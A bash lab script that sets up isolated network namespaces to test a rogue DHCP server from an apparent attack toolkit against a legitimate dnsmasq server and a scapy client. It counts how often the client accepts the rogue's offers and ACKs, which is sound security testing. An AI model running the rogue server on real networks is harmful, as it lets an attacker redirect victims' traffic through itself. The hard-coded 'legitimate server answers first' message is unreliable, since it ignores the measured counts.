#!/usr/bin/env bash
# Isolated rogue DHCP server lab (Linux only, needs root).
#
# Topology: one bridge (the LAN) with three hosts attached:
#
#   server:   dnsmasq, the legitimate DHCP server (10.99.0.1, pool 10.99.0.100-119,
#             router 10.99.0.1).
#   attacker: MACabre's rogue DHCP server (10.99.0.250), offering 10.99.0.200 with
#             itself as router and DNS.
#   client:   a DHCP client that runs five full handshakes (DISCOVER, OFFER,
#             REQUEST, ACK) and records which server answered first and which one
#             acknowledged the lease.
#
#   Phase 1 (baseline): only the legitimate server runs. Every offer comes from it.
#   Phase 2 (attack): the rogue server runs. The lab counts the rounds in which the
#            client's first offer came from the rogue, and the rounds it ACKed by it.
#
# The client takes the first offer, as most clients do. The race between the two
# servers is decided by timing on this host, so the counts are a measurement of this
# lab, not a rate for real networks.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/rogue_dhcp_server_lab.sh
#   sudo ROUNDS=10 scripts/lab/rogue_dhcp_server_lab.sh
#
# Requirements: iproute2, dnsmasq, and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip dnsmasq; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
ROUNDS="${ROUNDS:-5}"
ATTACK_SECONDS=30
CLIENT_MAC="02:00:00:00:00:50"
ROGUE_IP="10.99.0.250"
LEGIT_IP="10.99.0.1"
WORK="$(mktemp -d)"
LOG="$WORK/dnsmasq.log"

stop_lab() {
    for pid in $(ip netns pids server 2>/dev/null || true); do
        kill "$pid" 2>/dev/null || true
    done
    for ns in client attacker server lan; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
cleanup() {
    stop_lab
    rm -rf "$WORK"
}
trap cleanup EXIT

stop_lab

ip netns add lan
ip netns add server
ip netns add attacker
ip netns add client

# Each host has a veth to a port of the LAN bridge.
for pair in "srv:server" "att:attacker" "cli:client"; do
    name="${pair%%:*}"
    ns="${pair##*:}"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
done

ip netns exec lan ip link add br0 type bridge
ip netns exec lan ip link set br0 up
for name in srv att cli; do
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
done

ip netns exec server ip link set lo up
ip netns exec server ip addr add "$LEGIT_IP/24" dev h-srv
ip netns exec server ip link set h-srv up
ip netns exec attacker ip link set h-att up
ip netns exec client ip link set h-cli address "$CLIENT_MAC"
ip netns exec client ip link set h-cli up

ip netns exec server dnsmasq \
    --keep-in-foreground \
    --interface=h-srv \
    --bind-interfaces \
    --port=0 \
    --conf-file=/dev/null \
    --dhcp-authoritative \
    --no-ping \
    --dhcp-range=10.99.0.100,10.99.0.119,12h \
    --dhcp-leasefile="$WORK/leases" \
    --log-dhcp \
    --log-facility="$LOG" &
sleep 2

ROGUE_CODE='
import os, threading
from macabre.attacks.rogue_dhcp_server import RogueDhcpConfig, run_rogue_dhcp
stop = threading.Event()
threading.Timer(float(os.environ["ATTACK_SECONDS"]), stop.set).start()
stats = run_rogue_dhcp(
    RogueDhcpConfig(iface="h-att", server_ip="10.99.0.250", offer_ip="10.99.0.200"),
    stop,
    lambda _: None,
)
print(f"Rogue: sent {stats.offers} offers and {stats.acks} acks")
'

# A client that runs full handshakes and reports which server answered first and acked.
CLIENT_CODE='
import os, random, time
from scapy.all import AsyncSniffer, sendp, BOOTP, DHCP
from macabre.attacks.dhcp_starvation import build_discover, build_request

MAC = os.environ["CLIENT_MAC"]
ROUNDS = int(os.environ["ROUNDS"])
rng = random.Random()
seen = []

def on_packet(pkt):
    if pkt.haslayer(DHCP) and pkt.haslayer(BOOTP) and pkt[BOOTP].op == 2:
        seen.append(pkt)

def options(pkt):
    return {o[0]: o[1] for o in pkt[DHCP].options if isinstance(o, tuple)}

def mtype(pkt):
    return options(pkt).get("message-type")

sniffer = AsyncSniffer(iface="h-cli", store=False, prn=on_packet)
sniffer.start()
time.sleep(0.5)
first_offer_rogue = 0
acked_rogue = 0
for n in range(1, ROUNDS + 1):
    xid = rng.getrandbits(32)
    seen.clear()
    sendp(build_discover(MAC, xid), iface="h-cli", verbose=False)
    time.sleep(1.5)
    offers = [p for p in seen if p[BOOTP].xid == xid and mtype(p) == 2]
    if not offers:
        print(f"round {n}: no offer")
        continue
    first = offers[0]
    opts = options(first)
    server = opts.get("server_id")
    router = opts.get("router")
    yiaddr = first[BOOTP].yiaddr
    if server == "10.99.0.250":
        first_offer_rogue += 1
    seen.clear()
    sendp(build_request(MAC, xid, yiaddr, server), iface="h-cli", verbose=False)
    time.sleep(1.5)
    acks = [p for p in seen if p[BOOTP].xid == xid and mtype(p) == 5]
    ack_server = options(acks[0]).get("server_id") if acks else None
    if ack_server == "10.99.0.250":
        acked_rogue += 1
    ack_text = ack_server or "none"
    print(f"round {n}: first offer from {server} (router {router}, address {yiaddr}); ack from {ack_text}")
sniffer.stop()
print(f"Client: first offer from the rogue in {first_offer_rogue} of {ROUNDS} rounds; ack from the rogue in {acked_rogue} of {ROUNDS}")
'

run_client() {
    ip netns exec client env PYTHONPATH="$ROOT/src" CLIENT_MAC="$CLIENT_MAC" ROUNDS="$ROUNDS" "$PY" -c "$CLIENT_CODE"
}

echo "Phase 1: baseline, legitimate server only ($ROUNDS rounds)"
run_client | tee "$WORK/baseline.txt"
echo

echo "Phase 2: rogue and legitimate server both running for ${ATTACK_SECONDS}s ($ROUNDS rounds)"
ip netns exec attacker env PYTHONPATH="$ROOT/src" ATTACK_SECONDS="$ATTACK_SECONDS" "$PY" -c "$ROGUE_CODE" &
ROGUE_PID=$!
sleep 2
run_client | tee "$WORK/race.txt"
wait "$ROGUE_PID"
echo

echo "Phase 3: legitimate server stopped (down or pool exhausted), rogue running for ${ATTACK_SECONDS}s ($ROUNDS rounds)"
for pid in $(ip netns pids server 2>/dev/null || true); do
    kill "$pid" 2>/dev/null || true
done
sleep 2
ip netns exec attacker env PYTHONPATH="$ROOT/src" ATTACK_SECONDS="$ATTACK_SECONDS" "$PY" -c "$ROGUE_CODE" &
ROGUE_PID=$!
sleep 2
run_client | tee "$WORK/alone.txt"
wait "$ROGUE_PID"
echo

BASE_ROGUE="$(grep -c 'first offer from 10.99.0.250' "$WORK/baseline.txt" || true)"
RACE_ROGUE="$(grep -c 'first offer from 10.99.0.250' "$WORK/race.txt" || true)"
ALONE_ROGUE="$(grep -c 'first offer from 10.99.0.250' "$WORK/alone.txt" || true)"
ALONE_ACK="$(grep -c 'ack from 10.99.0.250' "$WORK/alone.txt" || true)"

if (( BASE_ROGUE == 0 )); then
    echo "Baseline: every first offer came from the legitimate server ($LEGIT_IP). OK"
else
    echo "Baseline: $BASE_ROGUE first offers came from the rogue before the attack. Result unreliable."
fi
echo "Race: with both servers running, the client's first offer came from the rogue in $RACE_ROGUE of $ROUNDS rounds. In this lab the legitimate server answers first."
if (( ALONE_ROGUE > 0 )); then
    echo "Alone: with the legitimate server stopped, the client took its first offer from the rogue in $ALONE_ROGUE of $ROUNDS rounds, and was acknowledged by it in $ALONE_ACK. Vulnerable."
else
    echo "Alone: the client never took its first offer from the rogue. Result unreliable."
fi
